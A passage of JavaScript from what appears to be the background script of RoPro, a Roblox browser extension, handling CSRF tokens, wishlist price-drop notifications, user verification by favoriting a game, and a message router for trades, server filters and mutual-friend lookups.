		$.post('https://catalog.roblox.com/v1/catalog/items/details').fail(function(r,e,s){
			token = r.getResponseHeader('x-csrf-token')
			myToken = token
			chrome.storage.sync.set({'token': token})
			resolve(token)
		})
	})
}

function doFavorite(universeId, unfavorite) {
	return new Promise(resolve => {
		async function doFavoriteRequest(resolve) {
			await updateToken()
			$.ajax({
				url: "https://games.roblox.com/v1/games/" + universeId + "/favorites",
				type: "POST",
				headers: {"X-CSRF-TOKEN": myToken},
				contentType: 'application/json',
				data: JSON.stringify({"isFavorited": !unfavorite}),
				success: function(data) {
					resolve(data)
				},
				error: function (textStatus, errorThrown) {
					resolve(errorThrown)
				}
			})
		}
		doFavoriteRequest(resolve)
	})
}

async function checkWishlist() {
	verificationDict = await getStorage('userVerification')
	userID = await getStorage('rpUserID')
	roproVerificationToken = "none"
	if (typeof verificationDict != 'undefined') {
		if (verificationDict.hasOwnProperty(userID)) {
			roproVerificationToken = verificationDict[userID]
		}
	}
	$.post({'url': 'https://api.ropro.io/wishlistCheck.php', 'headers': {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, async function(data) {
		if (Object.keys(data).length > 0) {
			await updateToken()
			var payload = {"items": []}
			var prices = {}
			for (const [id, item] of Object.entries(data)) {
				if (parseInt(Math.abs((parseInt(item['currPrice']) - parseInt(item['prevPrice'])) / parseInt(item['prevPrice']) * 100)) >= 10) {
					if (item['type'] == 'asset') {
						payload['items'].push({"itemType": "Asset","id": parseInt(id)})
					}
					prices[parseInt(id)] = [parseInt(item['prevPrice']), parseInt(item['currPrice'])]
				}
			}
			$.post({'url': 'https://catalog.roblox.com/v1/catalog/items/details', 'headers': {'X-CSRF-TOKEN': myToken, 'Content-Type': 'application/json'}, data: JSON.stringify(payload)}, async function(data) {
				console.log(data)
				for (var i = 0; i < data.data.length; i++) {
					var item = data.data[i]
					$.get('https://api.ropro.io/getAssetThumbnailUrl.php?id=' + item.id, function(imageUrl) {
						var options = {type: "basic", title: item.name, iconUrl: imageUrl, priority: 2, message:'Old Price: ' + prices[item.id][0] + ' Robux\nNew Price: ' + prices[item.id][1] + ' Robux', contextMessage: 'Price Fell By ' + parseInt(Math.abs((prices[item.id][1] - prices[item.id][0]) / prices[item.id][0] * 100)) + '%', eventTime: Date.now()}
						var notificationId = Math.floor(Math.random() * 1000000).toString()
						notifications[notificationId] = {type: "wishlist", itemId: item.id}
						createNotification(notificationId, options)
					})
				}
			})
		}
	})
}

function getVerificationToken() {
	return new Promise(resolve => {
		async function generateVerificationToken(resolve) {
			try {
				$.ajax({
					type: "POST",
					url: "https://api.ropro.io/generateVerificationToken.php",
					success: function(data){
						if (data.success == true) {
							resolve(data.token)
						} else {
							resolve(null)
						}
					},
					error: function(XMLHttpRequest, textStatus, errorThrown) {
					   resolve(null)
					}
				  });
			} catch (e) {
				console.log(e)
				resolve(null)
			}
		}
		generateVerificationToken(resolve)
	})
}

function verifyUser() {  //Because Roblox offers no public OAuth API which RoPro can use to authenticate the user ID of RoPro users, when the user clicks the verify button on the Roblox homepage RoPro will automatically favorite then unfavorite a test game in order to verify the user's Roblox username & ID.
	return new Promise(resolve => {
		async function doVerify(resolve) {
			try {
				$.post('https://api.ropro.io/verificationMetadata.php', async function(data) {
					verificationPlace = data['universeId']
					favorite = await doFavorite(verificationPlace, false)
					console.log(favorite)
					verificationToken = await getVerificationToken()
					console.log(verificationToken)
					unfavorite = await doFavorite(verificationPlace, true)
					console.log(unfavorite)
					if (verificationToken != null && verificationToken.length == 25) {
						console.log("Successfully verified.")
						var verificationDict = await getStorage('userVerification')
						var myId = await getStorage('rpUserID')
						verificationDict[myId] = verificationToken
						await setStorage('userVerification', verificationDict)
						resolve("success")
					} else {
						resolve(null)
					}
				}).fail(function(r,e,s){
					resolve(null)
				})
			} catch(e) {
				resolve(null)
			}
		}
		doVerify(resolve)
	})
}

chrome.runtime.onMessage.addListener(function(request,sender,sendResponse)
{
	switch(request.greeting) {
		case "GetURL":
			if (request.url.startsWith('https://ropro.io') || request.url.startsWith('https://api.ropro.io')) {
				async function doPost() {
					verificationDict = await getStorage('userVerification')
					userID = await getStorage('rpUserID')
					roproVerificationToken = "none"
					if (typeof verificationDict != 'undefined') {
						if (verificationDict.hasOwnProperty(userID)) {
							roproVerificationToken = verificationDict[userID]
						}
					}
					$.post({'url':request.url, 'headers': {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, function(data) {
						sendResponse(data);
					}).fail(function() {
						sendResponse("ERROR")
					})
				}
				doPost()
			} else {
				$.get(request.url, function(data) {
					sendResponse(data);
				}).fail(function() {
					sendResponse("ERROR")
				})
			}
			break;
		case "GetURLCached":
			$.get({url: request.url, headers: {'Cache-Control': 'public, max-age=604800', 'Pragma': 'public, max-age=604800'}}, function(data) {
				sendResponse(data);
			}).fail(function() {
				sendResponse("ERROR")
			})
			break;
		case "PostURL":
			if (request.url.startsWith('https://ropro.io') || request.url.startsWith('https://api.ropro.io')) {
				async function doPostURL() {
					verificationDict = await getStorage('userVerification')
					userID = await getStorage('rpUserID')
					roproVerificationToken = "none"
					if (typeof verificationDict != 'undefined') {
						if (verificationDict.hasOwnProperty(userID)) {
							roproVerificationToken = verificationDict[userID]
						}
					}
					$.ajax({
						url: request.url,
						type: "POST",
						headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID},
						data: request.jsonData,
						success: function(data) {
							sendResponse(data);
						}
					})
				}
				doPostURL()
			} else {
				$.ajax({
					url: request.url,
					type: "POST",
					data: request.jsonData,
					success: function(data) {
						sendResponse(data);
					}
				})
			}
			break;
		case "PostValidatedURL":
			$.ajax({
				url: request.url,
				type: "POST",
				headers: {"X-CSRF-TOKEN": myToken},
				contentType: 'application/json',
				data: request.jsonData,
				success: function(data) {
					if (!("errors" in data)) {
						sendResponse(data);
					} else {
						sendResponse(null)
					}
				},
				error: function(response) {
					if (response.status != 403) {
						sendResponse(null)
					}
					token = response.getResponseHeader('x-csrf-token')
					myToken = token
					$.ajax({
						url: request.url,
						type: "POST",
						headers: {"X-CSRF-TOKEN": myToken},
						contentType: 'application/json',
						data: request.jsonData,
						success: function(data) {
							if (!("errors" in data)) {
								sendResponse(data);
							} else {
								sendResponse(null)
							}
						},
						error: function(response) {
							sendResponse(null)
						}
					})
				}
			})
			break;
		case "GetStatusCode": 
			$.get({url: request.url}).always(function(r, e, s){
				sendResponse(r.status)
			})
			break;
		case "ValidateLicense":
			subscriptionManager.validateLicense()
			tradeNotifierInitialized = false
			break;
		case "DeclineTrade": 
			$.post({url: 'https://trades.roblox.com/v1/trades/' + parseInt(request.tradeId) + '/decline', headers: {'X-CSRF-TOKEN': myToken}}, function(data,error,res) {
				sendResponse(res.status)
			}).fail(function(r, e, s){
				if (r.status == 403) {
					$.post({url: 'https://trades.roblox.com/v1/trades/' + parseInt(request.tradeId) + '/decline', headers: {'X-CSRF-TOKEN' : r.getResponseHeader('x-csrf-token')}}, function(data,error,res) {
						sendResponse(r.status)
					})
				} else {
					sendResponse(r.status)
				}
			})
			break;
		case "GetUserID":
			$.get('https://users.roblox.com/v1/users/authenticated', function(data,error,res) {
				sendResponse(data['id'])
			})
			break;
		case "GetCachedTrades":
			sendResponse(inboundsCache)
			break;
		case "DoCacheTrade":
			function loadInbound(id) {
				if (id in inboundsCache && inboundsCache[id] != null) {
					sendResponse([inboundsCache[id], 1])
				} else {
					$.get('https://trades.roblox.com/v1/trades/' + id, function(data) {
						console.log(data)
						inboundsCache[data.id] = data
						sendResponse([data, 0])
					}).fail(function(r, e, s) {
						sendResponse(r.status)
					})
				}
            }
            loadInbound(request.tradeId)
			break;
		case "GetUsername":
			async function getUsername(){
				username = await getStorage("rpUsername")
				sendResponse(username)
			}
			getUsername()
			break;
		case "GetUserInventory":
				async function getInventory(){
					inventory = await loadInventory(request.userID)
					sendResponse(inventory)
				}
				getInventory()
				break;
		case "GetUserLimitedInventory":
			async function getLimitedInventory(){
				inventory = await loadLimitedInventory(request.userID)
				sendResponse(inventory)
			}
			getLimitedInventory()
			break;
		case "ServerFilterReverseOrder":
				async function getServerFilterReverseOrder(){
					var serverList = await serverFilterReverseOrder(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterReverseOrder()
				break;
		case "ServerFilterNotFull":
				async function getServerFilterNotFull(){
					var serverList = await serverFilterNotFull(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterNotFull()
				break;
		case "ServerFilterRandomShuffle":
				async function getServerFilterRandomShuffle(){
					var serverList = await serverFilterRandomShuffle(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterRandomShuffle()
				break;
		case "ServerFilterRegion":
				async function getServerFilterRegion(){
					var serverList = await serverFilterRegion(request.gameID, request.serverLocation)
					sendResponse(serverList)
				}
				getServerFilterRegion()
				break;
		case "ServerFilterBestConnection":
				async function getServerFilterBestConnection(){
					var serverList = await serverFilterBestConnection(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterBestConnection()
				break;
		case "ServerFilterNewestServers":
			async function getServerFilterNewestServers(){
				var serverList = await serverFilterNewestServers(request.gameID)
				sendResponse(serverList)
			}
			getServerFilterNewestServers()
			break;
		case "ServerFilterOldestServers":
			async function getServerFilterOldestServers(){
				var serverList = await serverFilterOldestServers(request.gameID)
				sendResponse(serverList)
			}
			getServerFilterOldestServers()
			break;
		case "ServerFilterMaxPlayers":
			async function getServerFilterMaxPlayers(){
				servers = await maxPlayerCount(request.gameID, request.count)
				sendResponse(servers)
			}
			getServerFilterMaxPlayers()
			break;
		case "GetRandomServer":
			async function getRandomServer(){
				randomServerElement = await randomServer(request.gameID)
				sendResponse(randomServerElement)
			}
			getRandomServer()
			break;
		case "GetProfileValue":
			getProfileValue(request.userID).then(sendResponse)
			break;
		case "GetSetting":
			async function getSettings(){
				setting = await loadSettings(request.setting)
				sendResponse(setting)
			}
			getSettings()
			break;
		case "GetTrades":
			async function getTradesType(type){
				tradesType = await loadTradesType(type)
				sendResponse(tradesType)
			}
			getTradesType(request.type)
			break;
		case "GetTradesData":
			async function getTradesData(type){
				tradesData = await loadTradesData(type)
				sendResponse(tradesData)
			}
			getTradesData(request.type)
			break;
		case "GetSettingValidity":
			async function getSettingValidity(){
				valid = await loadSettingValidity(request.setting)
				sendResponse(valid)
			}
			getSettingValidity()
			break;
		case "GetSettingValidityInfo":
			async function getSettingValidityInfo(){
				valid = await loadSettingValidityInfo(request.setting)
				sendResponse(valid)
			}
			getSettingValidityInfo()
			break;
		case "CheckVerification":
			async function getUserVerification(){
				verificationDict = await getStorage('userVerification')
				if (typeof verificationDict == 'undefined') {
					sendResponse(false)
				} else {
					if (verificationDict.hasOwnProperty(await getStorage('rpUserID'))) {
						sendResponse(true)
					} else {
						sendResponse(false)
					}
				}
			}
			getUserVerification()
			break;
		case "HandleUserVerification":
			async function doUserVerification(){
				verification = await verifyUser()
				verificationDict = await getStorage('userVerification')
				if (typeof verificationDict == 'undefined') {
					sendResponse(false)
				} else {
					if (verificationDict.hasOwnProperty(await getStorage('rpUserID'))) {
						sendResponse(true)
					} else {
						sendResponse(false)
					}
				}
			}
			doUserVerification()
			break;
		case "SyncSettings":
			syncSettings()
			setTimeout(function(){
				sendResponse("sync")
			}, 500)
			break;
		case "OpenOptions":
			chrome.tabs.create({url: chrome.extension.getURL('/options.html')})
			break;
		case "GetSubscription":
			async function doGetSubscription() {
				subscription = await getStorage("rpSubscription")
				sendResponse(subscription)
			}
			doGetSubscription()
			break;
		case "DeclineBots":
			async function doDeclineBots() {
				tradesDeclined = await declineBots()
				sendResponse(tradesDeclined)
			}
			doDeclineBots()
			break;
		case "GetMutualFriends":
			async function doGetMutualFriends(){
				mutuals = await mutualFriends(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFriends()
			break;
		case "GetMutualFollowers":
			async function doGetMutualFollowers(){
				mutuals = await mutualFollowers(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFollowers()
			break;
		case "GetMutualFollowing":
			async function doGetMutualFollowing(){
				mutuals = await mutualFollowing(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFollowing()
			break;
		case "GetMutualFavorites":
			async function doGetMutualFavorites(){
				mutuals = await mutualFavorites(request.userID, request.assetType)
				sendResponse(mutuals)
			}
			doGetMutualFavorites()
			break;
		case "GetMutualBadges":
			async function doGetMutualBadges(){
				mutuals = await mutualFavorites(request.userID, request.assetType)
				sendResponse(mutuals)
			}
			doGetMutualBadges()
			break;
		case "GetMutualGroups":
			async function doGetMutualGroups(){
				mutuals = await mutualGroups(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualGroups()
			break;
		case "GetMutualLimiteds":
			async function doGetMutualLimiteds(){
				mutuals = await mutualLimiteds(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualLimiteds()
			break;
		case "GetMutualItems":
			async function doGetMutualItems(){
				mutuals = await mutualItems(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualItems()
			break;
		case "GetItemValues":
			fetchItemValues(request.assetIds).then(sendResponse)
			break;
		case "CreateInviteTab":
			chrome.tabs.create({url: 'https://roblox.com/games/' + parseInt(request.placeid), active: false}, function(tab) {
				chrome.tabs.onUpdated.addListener(function tempListener (tabId , info) {
					if (tabId == tab.id && info.status === 'complete') {
						chrome.tabs.sendMessage(
							tabId,
							{type: "invite", key: request.key}
						  )
						chrome.tabs.onUpdated.removeListener(tempListener);
						setTimeout(function() {
							sendResponse(tab)
						}, 2000)
					}
				});
			})
			break;
		case "UpdateGlobalTheme":
			async function doLoadGlobalTheme(){
				await loadGlobalTheme()
				sendResponse()
			}
			doLoadGlobalTheme()
			break;
		case "LaunchCloudPlay":
			launchCloudPlayTab(request.placeID, request.serverID, request.accessCode)
			break;
	}

	return true;
})
setInterval(sendNotifications, 2 * 60 * 1000);
